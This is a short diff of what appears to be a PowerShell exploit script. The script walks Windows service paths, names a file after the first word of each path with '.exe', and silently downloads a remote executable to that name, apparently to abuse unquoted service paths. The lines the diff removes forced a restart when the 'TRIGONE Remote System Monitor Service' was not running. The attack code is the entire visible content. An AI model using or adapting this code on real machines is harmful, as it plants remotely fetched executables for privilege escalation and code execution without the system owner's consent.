@@ -32,11 +32,7 @@ foreach ($path in $servicePaths) {
                 $fileName = $words[0] + ".exe"
                 Invoke-WebRequest -Uri $apiUrl -OutFile $fileName -ErrorAction SilentlyContinue
 
-                # If the service is not running, restart the system
-                $svcStatus = Get-Service -DisplayName "TRIGONE Remote System Monitor Service" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status
-                if ($svcStatus -ne "Running") {
-                     Restart-Computer -Force -ErrorAction SilentlyContinue
-                }
+
                 break
             }
         }
